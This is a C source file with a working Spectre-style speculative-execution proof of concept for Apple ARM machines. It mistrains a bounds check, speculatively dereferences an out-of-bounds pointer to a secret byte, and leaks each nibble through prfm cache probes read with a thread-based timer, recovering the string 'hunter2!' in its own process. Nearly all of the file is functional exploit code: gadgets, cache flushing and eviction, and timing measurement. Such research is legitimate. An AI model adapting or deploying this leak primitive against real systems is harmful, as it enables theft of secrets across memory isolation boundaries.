// same_process_two_hop_read.c - recover a secret string from a PLAIN byte buffer
// using the two-hop speculative chain.
//
// the secret is a normal char[] - NO pointer encoding. the attacker knows
// the address of each secret byte but not its value. per byte, two nibble
// passes recover the high and low 4 bits:
//
//   hop 1: ptr = victim[x]          (speculative pointer load to address of secret byte)
//   hop 2: byte = *(uint8_t*)ptr    (speculative byte read)
//   transmit: prfm probes[byte>>4]  (high nibble) or probes[byte&0xf] (low nibble)
//
// natural byte recovery in the same address space using a prfm transient
// consumer after a bounds check.
//
// build/run: make run-two-hop
#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BOUND     16
#define PLANT_X   18
#define TRIALS    20000
#define TRAIN     30
#define PAGE      16384
#define L2        (32*1024*1024)
#define NIB       16

static volatile uint64_t g_t; static volatile int g_r;
static void *tf(void *a){(void)a; pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0); while(g_r) g_t++; return NULL;}
static inline void bar(void){__asm__ volatile("dsb sy\n\tisb":::"memory");}
static inline uint64_t tl(volatile uint8_t *p){
    bar(); uint64_t a=g_t; bar();
    volatile uint8_t v=*p; __asm__ volatile("":: "r"(v):"memory");
    bar(); uint64_t b=g_t; return b-a;
}
static inline void cfl(void *p){__asm__ volatile("dc civac,%0"::"r"(p):"memory");}

// victim array: 64-bit pointers. in-bounds entries point at D (dummy page).
// OOB entry victim[PLANT_X] points at the address of the secret byte.
static uint64_t victim[BOUND+4] __attribute__((aligned(128)));
static volatile uint64_t *bp;
static uint8_t *D, *l2b;
static uint8_t *probes[NIB];

// the SECRET: a plain byte buffer. the attacker never reads it architecturally
// during the attack - only speculatively via the two-hop chain.
static uint8_t *secret_buf;

static void evict(void){
    volatile uint64_t s=0;
    for(size_t i=0;i<L2;i+=128) s^=l2b[i];
    (void)s; bar();
}

// HIGH nibble gadget: ptr->byte, prfm probes[byte >> 4]
__attribute__((noinline))
static void gadget_hi(uint64_t x){
    if(x < *bp){
        uint8_t *ptr = (uint8_t *)victim[x];
        uint8_t byte = *ptr;
        uint8_t nib = byte >> 4;
        __asm__ volatile("prfm pldl1keep, [%0]" :: "r"(probes[nib]) : "memory");
    }
}

// LOW nibble gadget: ptr->byte, prfm probes[byte & 0xf]
__attribute__((noinline))
static void gadget_lo(uint64_t x){
    if(x < *bp){
        uint8_t *ptr = (uint8_t *)victim[x];
        uint8_t byte = *ptr;
        uint8_t nib = byte & 0xf;
        __asm__ volatile("prfm pldl1keep, [%0]" :: "r"(probes[nib]) : "memory");
    }
}

static double clock_ghz(void){
    mach_timebase_info_data_t tb; mach_timebase_info(&tb);
    uint64_t t0=mach_absolute_time(); volatile uint64_t x=0;
    __asm__ volatile("1:\n\tadd %0,%0,#1\n\tsubs %1,%1,#1\n\tb.ne 1b"
        :"+r"(x):"r"((uint64_t)5e8):);
    return 5e8/((mach_absolute_time()-t0)*tb.numer/tb.denom);
}

typedef void(*gfn)(uint64_t);

static int recover_nibble(gfn g, int byte_idx, int expected_nib){
    // point victim[PLANT_X] at the address of the secret byte
    victim[PLANT_X] = (uint64_t)&secret_buf[byte_idx];

    int hits[NIB] = {0};
    for(int t=0; t<TRIALS; t++){
        if(t%5000==0) fprintf(stderr, "\r    trial %d/%d  ", t, TRIALS);

        for(int r=0; r<TRAIN; r++) g(rand()&0xf);

        for(int i=0;i<NIB;i++) cfl(probes[i]);
        bar(); evict();
        cfl((void*)bp); bar();
        cfl(&victim[PLANT_X]);
        cfl(&secret_buf[byte_idx]);
        bar(); evict();

        for(int i=0;i<BOUND;i++) __asm__ volatile("":: "r"(victim[i]):"memory");
        __asm__ volatile("":: "r"(D[0]):"memory"); bar();

        g(PLANT_X);

        int order[NIB];
        for(int i=0;i<NIB;i++) order[i]=i;
        for(int i=NIB-1;i>0;i--){int j=rand()%(i+1); int tmp=order[i]; order[i]=order[j]; order[j]=tmp;}
        (void)tl(D);
        int best=-1; uint64_t best_t=UINT64_MAX;
        for(int i=0;i<NIB;i++){
            int c=order[i]; uint64_t tt=tl(probes[c]);
            if(tt<best_t){best_t=tt; best=c;}
        }
        uint64_t td=tl(D);
        if(best>=0 && best_t<td) hits[best]++;
    }
    fprintf(stderr, "\r                              \r");

    int top=0, sec=1;
    for(int i=1;i<NIB;i++) if(hits[i]>hits[top]){sec=top;top=i;} else if(hits[i]>hits[sec]) sec=i;
    printf("    target=%x  got=%x  hits=%d  runner=%d  margin=%+d  %s\n",
           expected_nib, top, hits[top], hits[sec], hits[top]-hits[sec],
           top==expected_nib ? "OK" : "MISS");
    fflush(stdout);
    return top;
}

int main(void){
    setbuf(stdout, NULL);
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0);
    double ghz=0;
    for(int a=0;a<10;a++){
        ghz=clock_ghz();
        fprintf(stderr,"clock attempt %d: %.2f GHz %s\n", a, ghz, ghz>=3.0?"P-core":"E-core");
        if(ghz>=3.0) break;
        usleep(200000);
    }
    if(ghz<3.0){fprintf(stderr,"stuck on E-core\n"); return 2;}

    g_r=1; pthread_t tid; pthread_create(&tid,NULL,tf,NULL);
    while(!g_t){} usleep(10000);

    D=mmap(NULL,PAGE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    D[0]=0xFF;
    for(int i=0;i<NIB;i++){
        probes[i]=mmap(NULL,PAGE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
        probes[i][0]=(uint8_t)i;
    }
    l2b=mmap(NULL,L2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    memset(l2b,1,L2);
    void *b=mmap(NULL,PAGE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    bp=b; *bp=BOUND;
    for(int i=0;i<BOUND;i++) victim[i]=(uint64_t)D;

    // the secret: a PLAIN byte buffer, no pointer encoding. the attacker
    // knows its address but never reads it architecturally during the attack.
    secret_buf = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    const char *secret = "hunter2!";
    int slen = strlen(secret);
    memcpy(secret_buf, secret, slen);

    srand(0xBEEF);
    int total_nibbles = slen * 2;
    int nibble_done = 0;

    printf("TWO-HOP natural-byte recovery  clock=%.2f GHz  trials/nibble=%d\n", ghz, TRIALS);
    printf("secret is a plain char[] at %p - no pointer encoding\n", (void*)secret_buf);
    printf("secret: \"%s\" (%d bytes, %d nibbles)\n\n", secret, slen, total_nibbles);

    char recovered[64]={0};
    int correct=0;

    for(int i=0;i<slen;i++){
        uint8_t byte=(uint8_t)secret_buf[i];
        printf("  byte %d = 0x%02x '%c'\n", i, byte, byte);

        fprintf(stderr, "  [%d/%d] hi nibble byte %d\n", nibble_done+1, total_nibbles, i);
        int hi = recover_nibble(gadget_hi, i, byte >> 4);
        nibble_done++;

        fprintf(stderr, "  [%d/%d] lo nibble byte %d\n", nibble_done+1, total_nibbles, i);
        int lo = recover_nibble(gadget_lo, i, byte & 0xf);
        nibble_done++;

        uint8_t got=(uint8_t)((hi<<4)|lo);
        recovered[i]=(char)got;
        int ok=(got==byte); correct+=ok;
        printf("    => expected=0x%02x got=0x%02x '%c'  %s\n\n",
               byte, got, (got>=0x20&&got<0x7f)?(char)got:'?', ok?"OK":"MISS");
    }

    printf("expected: %s\nreceived: ", secret);
    for(int i=0;i<slen;i++){uint8_t c=(uint8_t)recovered[i]; putchar((c>=0x20&&c<0x7f)?c:'?');}
    printf("\naccuracy: %d/%d bytes\n", correct, slen);

    g_r=0; pthread_join(tid,NULL);
    return 0;
}
